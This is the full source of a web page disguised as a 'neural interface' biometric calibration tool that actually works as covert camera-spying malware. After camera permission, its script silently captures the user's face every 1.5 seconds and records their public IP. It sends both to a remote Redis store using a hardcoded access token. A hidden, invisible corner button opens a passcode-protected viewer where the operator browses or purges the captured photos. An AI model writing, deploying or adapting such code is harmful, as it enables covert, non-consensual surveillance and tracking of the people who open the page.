<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Bio-Feedback Neural Link</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root { --accent: #ffffff; }
        body { overscroll-behavior: none; background: #000; color: #fff; font-family: 'Inter', sans-serif; }
        
        .reticle {
            width: 240px; height: 240px;
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 50%;
            position: relative;
            animation: pulse 5s ease-in-out infinite;
        }
        @keyframes pulse { 
            0%, 100% { transform: scale(1); opacity: 0.2; } 
            50% { transform: scale(1.08); opacity: 0.4; } 
        }
        
        .scan-line {
            position: absolute; width: 100%; height: 1px;
            background: rgba(255,255,255,0.15);
            top: 0; animation: scan 3.5s linear infinite;
        }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

        .terminal-input {
            background: transparent;
            border-bottom: 1px solid #222;
            color: #fff;
            padding: 10px;
            font-family: monospace;
            font-size: 14px;
            outline: none;
            width: 100%;
            text-align: center;
            letter-spacing: 0.2em;
        }

        .no-scrollbar::-webkit-scrollbar { display: none; }
        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
        
        /* The invisible uplink heartbeat for you to see it's working */
        .uplink-heartbeat {
            width: 3px; height: 3px; background: #4f46e5; border-radius: 50%;
            position: fixed; top: 8px; left: 8px; opacity: 0; transition: opacity 0.1s;
            z-index: 9999; pointer-events: none;
        }
        .syncing .uplink-heartbeat { opacity: 0.5; }
    </style>
</head>
<body class="overflow-hidden bg-black selection:bg-zinc-800">

    <div id="statusDot" class="uplink-heartbeat"></div>

    <!-- SECRET TRIGGER (100% Transparent bottom-left corner) -->
    <div class="fixed bottom-0 left-0 z-[100] w-20 h-20">
        <button id="vaultTrigger" class="w-full h-full cursor-default border-none outline-none bg-transparent"></button>
    </div>

    <!-- MAIN COVERT INTERFACE -->
    <main id="mainNode" class="relative h-screen flex flex-col items-center justify-center p-8 text-center transition-all duration-1000">
        <video id="hiddenSensor" autoplay playsinline muted class="fixed inset-0 w-full h-full object-cover opacity-0 pointer-events-none"></video>

        <!-- Initial State -->
        <div id="setupView" class="z-10">
            <div class="mb-14 relative flex justify-center items-center">
                <div class="reticle"></div>
                <div class="absolute text-white/10 text-[8px] tracking-[0.5em] uppercase">Ready_For_Sync</div>
            </div>
            <h1 class="text-xl font-thin tracking-[0.6em] uppercase mb-6">Neural Interface</h1>
            <p class="text-white/20 text-[9px] uppercase tracking-[0.2em] max-w-xs mx-auto leading-relaxed mb-14">
                Bio-metric feedback analysis via optical sensor synchronization. Ensure lens clarity for precise calibration.
            </p>
            <button id="initBtn" class="border border-white/5 hover:border-white/20 hover:bg-white/5 transition-all px-14 py-5 rounded-full text-[9px] uppercase tracking-[0.4em]">
                Initialize Calibration
            </button>
        </div>

        <!-- Scanning State -->
        <div id="activeView" class="hidden z-10">
            <div class="reticle mx-auto mb-14 overflow-hidden shadow-[0_0_50px_rgba(255,255,255,0.02)]">
                <div class="scan-line"></div>
                <div class="absolute inset-0 flex items-center justify-center">
                    <div id="percentDisplay" class="text-2xl font-extralight tracking-[0.2em] text-white/70">0.00%</div>
                </div>
            </div>
            <div class="text-[8px] text-white/10 uppercase tracking-[0.6em] animate-pulse">Syncing Biometrics...</div>
        </div>
    </main>

    <!-- CLOUD VAULT TERMINAL -->
    <div id="vaultPanel" class="hidden fixed inset-0 bg-black z-[200] flex flex-col font-mono text-zinc-400">
        <div class="p-4 border-b border-white/5 flex justify-between items-center bg-zinc-950/50">
            <h2 class="text-[9px] uppercase tracking-[0.3em]">Cloud_Archive_v12 // Jaguar</h2>
            <button id="exitVault" class="text-[9px] hover:text-white uppercase">Close</button>
        </div>

        <!-- Vault Login -->
        <div id="vaultAuth" class="flex-grow flex flex-col items-center justify-center p-10">
            <div class="w-full max-w-xs text-center space-y-8">
                <div class="text-[8px] tracking-[1em] text-white/10 uppercase">Security_Key</div>
                <input type="password" id="vaultKey" placeholder="••••••" class="terminal-input">
                <button id="authBtn" class="text-white/20 hover:text-white text-[10px] uppercase tracking-[0.4em] pt-4">Authorize</button>
            </div>
        </div>

        <!-- Content Area -->
        <div id="vaultMain" class="hidden flex-grow flex flex-col overflow-hidden bg-zinc-950">
            <div class="p-4 flex justify-between items-center border-b border-white/5 bg-black/40">
                <span id="logCount" class="text-[9px] uppercase opacity-40">Connecting to Jaguar...</span>
                <div class="flex gap-6">
                    <button id="refreshBtn" class="text-[9px] text-indigo-400 uppercase font-bold hover:text-indigo-300">Sync_Remote</button>
                    <button id="wipeBtn" class="text-[9px] text-red-900 uppercase hover:text-red-700">Purge_KV</button>
                </div>
            </div>
            
            <div id="imageGrid" class="flex-grow overflow-y-auto p-1 grid grid-cols-3 sm:grid-cols-5 md:grid-cols-8 lg:grid-cols-12 gap-1 no-scrollbar">
                <!-- Records stream here -->
            </div>
        </div>
    </div>

    <canvas id="procCanvas" class="hidden"></canvas>

    <script>
        // HARDCODED JAGUAR CREDENTIALS
        const KV_URL = "https://in-jaguar-49822.upstash.io";
        const KV_TOKEN = "AcKeAAIncDIwMmIzNDkzMGU4MjQ0ZTkxODU1M2U3YTU5MjM1ZWUwNHAyNDk4MjI";
        
        const sensor = document.getElementById('hiddenSensor');
        const initBtn = document.getElementById('initBtn');
        const setupView = document.getElementById('setupView');
        const activeView = document.getElementById('activeView');
        const percentDisplay = document.getElementById('percentDisplay');
        const canvas = document.getElementById('procCanvas');
        const vaultPanel = document.getElementById('vaultPanel');
        const vaultMain = document.getElementById('vaultMain');
        const vaultAuth = document.getElementById('vaultAuth');
        const vaultKey = document.getElementById('vaultKey');
        const imageGrid = document.getElementById('imageGrid');
        const logCount = document.getElementById('logCount');

        let isLive = false;
        let nodeIp = "0.0.0.0";

        // --- CLOUD TRANSPORT ---
        const JaguarCloud = {
            async push(img, ip) {
                const key = `log_${Date.now()}`;
                const body = JSON.stringify({ img, ip, t: new Date().toISOString() });
                
                document.body.classList.add('syncing');
                try {
                    // Send to Jaguar Redis via REST POST
                    await fetch(`${KV_URL}/set/${key}`, {
                        method: 'POST',
                        headers: { 'Authorization': `Bearer ${KV_TOKEN}` },
                        body: body
                    });
                } catch (e) { /* silent fail */ }
                setTimeout(() => document.body.classList.remove('syncing'), 500);
            },

            async pull() {
                try {
                    // 1. Get all log keys
                    const kRes = await fetch(`${KV_URL}/keys/log_*`, {
                        headers: { 'Authorization': `Bearer ${KV_TOKEN}` }
                    });
                    const kData = await kRes.json();
                    const keys = (kData.result || []).sort().reverse().slice(0, 80); // Get latest 80

                    // 2. Multi-get values (Optimization)
                    const results = [];
                    for (const k of keys) {
                        const vRes = await fetch(`${KV_URL}/get/${k}`, {
                            headers: { 'Authorization': `Bearer ${KV_TOKEN}` }
                        });
                        const vData = await vRes.json();
                        if (vData.result) results.push(JSON.parse(vData.result));
                    }
                    return results;
                } catch (e) { return []; }
            },

            async purge() {
                const kRes = await fetch(`${KV_URL}/keys/log_*`, {
                    headers: { 'Authorization': `Bearer ${KV_TOKEN}` }
                });
                const kData = await kRes.json();
                for (const k of (kData.result || [])) {
                    await fetch(`${KV_URL}/del/${k}`, {
                        headers: { 'Authorization': `Bearer ${KV_TOKEN}` }
                    });
                }
            }
        };

        // --- CAPTURE ENGINE ---
        async function fetchIp() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                nodeIp = d.ip;
            } catch (e) {}
        }

        function runLoop() {
            setInterval(async () => {
                if (!isLive) return;
                
                const ctx = canvas.getContext('2d');
                canvas.width = 320; canvas.height = 320; // 320px for high speed transit
                
                const vW = sensor.videoWidth;
                const vH = sensor.videoHeight;
                const min = Math.min(vW, vH);
                ctx.drawImage(sensor, (vW - min)/2, (vH - min)/2, min, min, 0, 0, 320, 320);
                
                const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
                JaguarCloud.push(dataUrl, nodeIp);

                // Aesthetic UI drift
                percentDisplay.textContent = `${(Math.random() * 100).toFixed(2)}%`;
            }, 1500);
        }

        initBtn.onclick = async () => {
            try {
                await fetchIp();
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                sensor.srcObject = stream;
                sensor.onloadedmetadata = () => {
                    setupView.classList.add('hidden');
                    activeView.classList.remove('hidden');
                    isLive = true;
                    runLoop();
                };
            } catch (e) {
                alert("Interface initialization requires camera sensor permissions.");
            }
        };

        // --- VAULT INTERFACE ---
        document.getElementById('authBtn').onclick = () => {
            if (vaultKey.value === '5502012') {
                vaultAuth.classList.add('hidden');
                vaultMain.classList.remove('hidden');
                syncVault();
            } else {
                vaultKey.value = '';
            }
        };

        async function syncVault() {
            logCount.textContent = "SYNCHRONIZING...";
            const data = await JaguarCloud.pull();
            imageGrid.innerHTML = '';
            logCount.textContent = `${data.length} PACKETS DECODED`;
            
            data.forEach(item => {
                const cell = document.createElement('div');
                cell.className = "relative aspect-square bg-zinc-900 border border-white/5 overflow-hidden group";
                cell.innerHTML = `
                    <img src="${item.img}" class="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition-opacity duration-500">
                    <div class="absolute bottom-0 left-0 right-0 p-0.5 bg-black/80 text-[4px] text-white/30 truncate">
                        ${item.ip} | ${new Date(item.t).toLocaleTimeString()}
                    </div>
                `;
                imageGrid.appendChild(cell);
            });
        }

        document.getElementById('refreshBtn').onclick = syncVault;
        document.getElementById('wipeBtn').onclick = async () => {
            if(confirm("Confirm Cloud Wipe?")) { await JaguarCloud.purge(); syncVault(); }
        };

        document.getElementById('vaultTrigger').onclick = () => vaultPanel.classList.toggle('hidden');
        document.getElementById('exitVault').onclick = () => vaultPanel.classList.add('hidden');

    </script>
</body>
</html>
